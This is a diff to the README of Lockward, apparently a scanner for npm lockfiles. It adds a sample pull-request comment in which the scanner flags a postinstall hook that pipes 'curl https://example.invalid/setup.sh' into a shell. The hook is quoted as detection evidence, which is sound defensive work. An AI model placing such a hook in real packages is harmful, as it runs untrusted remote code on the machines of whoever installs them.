@@ -50,7 +50,37 @@ A local composite action also lives at `.github/actions/lockward` for running fr
 ### What a finding looks like
 On a pull request, Lockward posts a comment and fails the check:
 
-![Lockward PR comment](docs/pr-comment.png)
+```markdown
+## Lockward
+
+**Target:** `{root}`
+
+**Scanned at:** 2026-10-12T00:00:00Z
+
+**Score:** 50 (high)
+
+**Gate:** Warning · Exit 1 · mode warn
+
+### Why
+
+- `Package mini-app@1.0.0 hook 'postinstall' contacts the network or downloads data. Evidence: 'curl https://example.invalid/setup.sh | sh'.`
+- `Package mini-app@1.0.0 hook 'postinstall' pipes a download into a shell. Evidence: 'curl https://example.invalid/setup.sh | sh'.`
+- **advisory_coverage:** `1 package was not checked against OSV (offline, no cache entry or a stale cache).`
+- **no_outbound_build:** `Package mini-app@1.0.0 hook 'postinstall' downloads during install and does not execute the content (LW-H003).`
+- **no_outbound_build:** `Package mini-app@1.0.0 hook 'postinstall' pipes downloaded content into a shell (LW-H004).`
+
+### Install hooks
+
+- `mini-app`@`1.0.0` `postinstall`: `curl https://example.invalid/setup.sh | sh`
+
+### Advisories
+
+No advisories in the cache.
+
+### Notes
+
+- `new_dependencies is inactive for this run because no baseline was passed.`
+```
 
 ## How it works
 
@@ -91,7 +121,7 @@ Lockfile ≤ 32 MiB / 100,000 packages, `package.json` ≤ 1 MiB (otherwise warn
 ## Status
 
 **Phase 1 (MVP):** npm lockfiles, static analysis (Mode 1), GitHub Action, CycloneDX SBOM.
-**Roadmap:** pip/cargo ecosystems, behavior sandbox (Mode 2), provenance/signing, team dashboard. Reports are currently in German (DACH-first); English localization is planned.
+**Roadmap:** pip/cargo ecosystems, behavior sandbox (Mode 2), provenance/signing, team dashboard.
 
 ## Verifying a release
 
